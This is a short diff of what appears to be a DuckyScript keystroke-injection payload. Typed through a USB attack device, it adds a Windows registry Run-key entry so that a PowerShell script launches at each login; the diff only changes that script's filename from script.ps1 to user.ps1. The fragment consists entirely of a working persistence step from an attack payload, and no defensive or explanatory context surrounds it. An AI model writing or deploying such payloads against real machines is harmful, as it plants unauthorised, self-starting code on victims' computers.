@@ -30,7 +30,7 @@ DELAY 500
 ENTER
 DELAY 500
 
-STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /t REG_SZ /d "$path\\script.ps1" /f
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartupScript" /t REG_SZ /d "$path\\user.ps1" /f
 ENTER
 DELAY 1000
 
